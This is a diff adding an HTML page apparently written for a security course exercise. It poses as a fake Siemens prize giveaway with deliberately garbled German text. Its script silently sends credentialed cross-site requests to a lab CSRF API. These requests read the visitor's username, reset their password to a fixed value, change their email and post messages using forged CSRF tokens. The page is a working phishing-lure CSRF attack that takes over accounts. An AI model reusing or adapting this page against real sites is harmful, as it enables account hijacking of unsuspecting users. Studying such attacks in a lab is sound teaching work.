@@ -1,0 +1,148 @@
+ <!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="UTF-8">
+    <title>FREEMENS</title>
+
+    <style>
+        html, body {
+            font-family: Arial,sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100%;
+        }
+
+        body {
+            text-align: center;
+        }
+
+        #logo {
+            width: 500px;
+            margin-top: 50px;
+        }
+
+        #trockner {
+            margin-top: 20px;
+            width: 200px;
+        }
+
+        #trockner:hover {
+            cursor: pointer;
+        }
+
+        #win {
+            margin-top: 30px;
+            font-size: 20px;
+            background-color: #50bebe;
+            color: white;
+            padding: 5px;
+        }
+
+        #win:hover {
+            cursor: pointer;
+        }
+
+        .glow {
+          font-size: 50px;
+          color: #fff;
+          text-align: center;
+          -webkit-animation: glow 1s ease-in-out infinite alternate;
+          -moz-animation: glow 1s ease-in-out infinite alternate;
+          animation: glow 1s ease-in-out infinite alternate;
+        }
+
+        @-webkit-keyframes glow {
+          from {
+            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #50bebe, 0 0 40px #50bebe, 0 0 50px #50bebe, 0 0 60px #50bebe, 0 0 70px #50bebe;
+          }
+          to {
+            text-shadow: 0 0 20px #fff, 0 0 30px #50bebe, 0 0 40px #50bebe, 0 0 50px #50bebe, 0 0 60px #50bebe, 0 0 70px #50bebe, 0 0 80px #50bebe;
+          }
+        }
+    </style>
+</head>
+
+<body>
+    <img id="logo" src="siemens_logo.png" />
+    <h1 class="glow">SIE HABIEN GEWONENENE<h1>
+    <button id="win" type="submit">JEZT WASHMINEE GRATIS</button>
+    <br />
+    <h2>Oder sie könen sicch regisrieien</h2>
+    <input type="email" id="email" placeholder="Email"/>
+    <button id="register">Registriereneawn</button>
+    <br />
+    <h3>Sagen si dirkt was zu trümp:</h3>
+    <input id="message" type="text" />
+    <button id="send">Senden</button>
+</body>
+</html>
+
+<script>
+const url = "https://m183.gibz-informatik.ch/api/csrf"
+
+window.onload = () => {
+    let winButton = document.getElementById("win")
+
+    winButton.onclick = function() {
+        getUsername(changePassword);
+    }
+
+    function getUsername(callback) {
+        fetch(url + "/getUsername", {
+            credentials: "include"
+        }).then(r => r.text()).then(username => {
+            callback(username);
+        })
+    }
+
+    function changePassword(username) {
+        const data = new FormData()
+        data.set("username", username)
+        data.set("password", "Pa$$word")
+        fetch(url + "/changePassword", {
+            credentials: "include",
+            body: data,
+            method: "POST",
+        });
+    }
+
+    let registerButton = document.getElementById("register")
+
+    registerButton.onclick = function() {
+        event.preventDefault();
+        changeEmail(document.getElementById("email").value)
+    }
+
+    function changeEmail(email) {
+        const data = {
+            email: email,
+            csrf: "00000000000000000000"
+        }
+        fetch(url + "/changeEmail", {
+            credentials: "include",
+            headers: { "content-type": "application/json;charset=UTF-8" },
+            body: JSON.stringify(data),
+            method: "POST"
+        }).then(r => console.log(r.status))
+    }
+
+    let sendButton = document.getElementById("send")
+        sendButton.onclick = function() {
+            event.preventDefault();
+            postMessage(document.getElementById("message").value)
+        }
+
+    function postMessage(message) {
+        const data = {
+            message: message,
+            csrf: "00000000000000000000"
+        }
+        fetch(url + "/postMessage", {
+            credentials: "include",
+            headers: { "content-type": "application/json;charset=UTF-8" },
+            body: JSON.stringify(data),
+            method: "POST"
+        }).then(r => console.log(r.status));
+    }
+}
+</script>
